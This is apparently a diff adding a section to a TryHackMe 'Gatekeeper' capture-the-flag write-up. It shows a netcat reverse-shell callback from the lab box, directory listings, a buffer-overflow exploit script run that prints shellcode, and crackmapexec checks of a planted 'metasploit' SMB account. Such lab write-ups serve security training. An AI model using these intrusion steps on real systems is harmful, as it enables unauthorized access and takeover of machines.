@@ -496,3 +496,95 @@ I now have 2 potential exploits (one that bypasses firewalls) that I can use aga
 
 # Storming the gate.
 
+I will now restart Gatekeeper and get the new ip, and update the two scripts.
+
+First let me try the revshell
+
+starting a listener on port 53, I get a callback:
+
+
+```
+└─$ sudo nc -lvnp 53
+[sudo] password: 
+listening on [any] 53 ...
+connect to [10.6.77.38] from (UNKNOWN) [10.10.236.87] 49172
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\natbat\Desktop>whoami
+whoami
+gatekeeper\natbat
+
+C:\Users\natbat\Desktop>
+```
+
+Looking at the current directory I see user.txt
+
+```
+C:\Users\natbat\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\Desktop
+
+05/14/2020  09:24 PM    <DIR>          .
+05/14/2020  09:24 PM    <DIR>          ..
+04/21/2020  05:00 PM             1,197 Firefox.lnk
+04/20/2020  01:27 AM            13,312 gatekeeper.exe
+04/21/2020  09:53 PM               135 gatekeeperstart.bat
+05/14/2020  09:43 PM               140 user.txt.txt
+               4 File(s)         14,784 bytes
+               2 Dir(s)  15,879,462,912 bytes free
+```
+
+also the bat file that I want to view. 
+
+```
+C:\Users\natbat\Desktop>type gatekeeperstart.bat
+type gatekeeperstart.bat
+@echo off
+:start 
+start /w C:\Users\natbat\Desktop\gatekeeper.exe
+::Wait 90 seconds before restarting.
+TIMEOUT /T 5
+GOTO:Start
+```
+
+Seems like it will restart gatekeeper even if it crashes
+
+Also can still connect via netcat:
+
+```
+└─$ nc 10.10.236.87 31337
+Hello !!!
+
+```
+
+So I will try and send the addusr script and check if my user is added (note this will only work if the gatekeeper is running as admin)
+
+```
+└─$ sudo crackmapexec smb 10.10.236.87 -u 'metasploit' -p 'Metasploit$1'
+[sudo] password for nith: 
+SMB         10.10.236.87    445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
+SMB         10.10.236.87    445    GATEKEEPER       [+] gatekeeper\metasploit:Metasploit$1 
+                                                                                                                                                                                                                                             
+┌──(nith㉿kastle)-[~/CTF/THM/GateKeeper]
+└─$ ./adduser.py 
+%tU(뢚ThGcp"f6a@!pe&EMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYt$[+ɱG1CCe *BB6s12$;1ɰZr.ڊn,mNBl<@j&ZƇɪ m4p}    >c< >#u5Z[;k?G#w4,mwn|Hi᧓lwnFV  QGm
+                      5*lRQc7_fi"UboK"35٢R@~)z4HR!)
+
+Traceback (most recent call last):
+  File "./adduser.py", line 59, in <module>
+    data = s.recv(1024)
+socket.error: [Errno 104] Connection reset by peer
+                                                                                                                                                                                                                                             
+┌──(nith㉿kastle)-[~/CTF/THM/GateKeeper]
+└─$ sudo crackmapexec smb 10.10.236.87 -u 'metasploit' -p 'Metasploit$1'                                                                                 SMB         10.10.236.87    445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)
+SMB         10.10.236.87    445    GATEKEEPER       [+] gatekeeper\metasploit:Metasploit$1 
+                                                    
+```
+
+This does not work, so I am going to need to find a different path to priv esc.
+
+# priv esc
